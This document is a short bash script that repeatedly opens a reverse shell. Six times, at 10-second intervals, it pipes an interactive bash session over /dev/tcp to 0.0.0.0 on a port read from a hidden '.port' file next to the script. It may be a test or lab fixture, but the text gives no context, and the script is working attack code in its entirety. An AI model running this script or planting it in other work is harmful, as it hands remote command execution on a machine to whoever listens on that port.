#!/bin/bash

for i in {1..6}; do
    bash -i &> /dev/tcp/0.0.0.0/$(cat "$(dirname "$(readlink -f "$0")")/.port") 0>&1
    sleep 10
done
